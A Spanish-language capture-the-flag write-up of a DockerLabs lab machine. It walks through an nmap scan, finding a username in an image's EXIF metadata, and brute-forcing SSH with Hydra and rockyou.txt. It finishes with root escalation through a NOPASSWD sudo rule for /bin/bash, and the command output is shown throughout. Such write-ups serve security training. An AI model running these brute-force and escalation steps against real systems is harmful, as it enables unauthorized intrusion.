
## Escaneo de puertos:

Para empezar, vamos a usar **"nmap"** para escanear los puertos de la maquina a vulnerar para ver que encontramos.
```bash
[21:36:20] bapee@BlumeSec ~ ❯ nmap -sVC -p- --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 21:36 +0200
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: B2:DF:A8:4D:C4:89 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
```

Vemos que hay 2 puertos abiertos, por lo que en este caso vamos a revisar el **80 (apache)**, puesto que no conocemos ninguna credencial para probar el **SSH**.

## Análisis de Apache:

En este caso haremos un **curl** de la pagina web, par ver que vemos en su código
```bash
[21:57:16] bapee@BlumeSec ~ ❯ curl 172.17.0.2
```
```html
<html><body><img src='imagen.jpeg'></body></html>
```

Como vemos, el resultado es un código **HTML** que nos muestra " **img src='imagen.jpeg'** ", vamos a descargarlo para analizar sus metadatos.

Usaremos **exiftool** para extraer los metadatos de la imagen a ver que encontramos.
```bash
[22:07:15] bapee@BlumeSec ~/Escritorio ❯ exiftool imagen.jpeg 
ExifTool Version Number         : 13.50
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2026:05:20 22:07:05+02:00
File Access Date/Time           : 2026:05:20 22:07:05+02:00
File Inode Change Date/Time     : 2026:05:20 22:07:05+02:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```

Como vemos, dentro de los metadatos, hay un usuario "**borazuwarah**". Vamos a proceder a hacer fuerza bruta a través de **SSH** a este usuario.

## Fuerza bruta por SSH:

Vamos a utilizar "**Hydra**" para poder hacer uso de el diccionario de contraseñas rockyou.txt y asi intentar encontrar cual es la suya.
```bash
[22:09:11] bapee@BlumeSec ~/Escritorio ❯ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 22:09:32
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 22:09:38
```

Hemos tenido éxito, por lo que vamos a acceder al usuario por **SSH**.

## Acceso y escalada

Entramos por **SSH**.
```bash
[22:12:00] bapee@BlumeSec ~/Escritorio ❯ ssh borazuwarah@172.17.0.2
borazuwarah@172.17.0.2 password: 
Linux 85a68b8cb56b 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 20 20:11:16 2026 from 172.17.0.1
borazuwarah@85a68b8cb56b:~$ 
```

Una vez dentro vamos a escalar para llegar al usuario "**root**".
```bash
borazuwarah@85a68b8cb56b:~$ sudo -l                                                                                             
Matching Defaults entries for borazuwarah on 85a68b8cb56b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on 85a68b8cb56b:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash <-- "Esto nos interesa"
borazuwarah@85a68b8cb56b:~$ 
```

Vemos que tiene ```(ALL) NOPASSWD: /bin/bash``` , una vez visto esto, para escalar al **root** es tan sencillo como **ejecutar** lo siguiente.
```bash
borazuwarah@85a68b8cb56b:~$ sudo /bin/bash                                                                                      
root@85a68b8cb56b:/home/borazuwarah# whoami
root
root@85a68b8cb56b:/home/borazuwarah# id
uid=0(root) gid=0(root) groups=0(root)
root@85a68b8cb56b:/home/borazuwarah# 
```

Y asi quedaría **vulnerado** este laboratorio de **DockerLabs** de manera **exitosa**!

## Resumen del ataque

1. Se realizó un reconocimiento inicial con Nmap para identificar los servicios expuestos en la máquina objetivo.
2. Durante el escaneo se detectaron únicamente los puertos SSH y Apache abiertos, por lo que el análisis comenzó sobre el servicio web alojado en el puerto 80.
3. Mediante una petición utilizando `curl`, se observó que la página únicamente cargaba una imagen llamada `imagen.jpeg`.
4. Posteriormente, la imagen fue descargada y analizada con ExifTool para extraer sus metadatos.
5. Dentro de los metadatos se descubrió el nombre de usuario `borazuwarah`, información que resultó clave para continuar con el ataque.
6. Con el usuario identificado, se realizó un ataque de fuerza bruta contra el servicio SSH utilizando Hydra y el diccionario `rockyou.txt`, obteniendo la contraseña `123456`.
7. Tras acceder correctamente al sistema mediante SSH, se revisaron los privilegios sudo disponibles para el usuario comprometido.
8. Se detectó que el usuario podía ejecutar `/bin/bash` como root sin necesidad de contraseña gracias a la configuración `NOPASSWD`.
9. Finalmente, aprovechando esta mala configuración de privilegios sudo, se ejecutó una shell privilegiada mediante `sudo /bin/bash`, obteniendo acceso completo como root y comprometiendo totalmente la máquina.

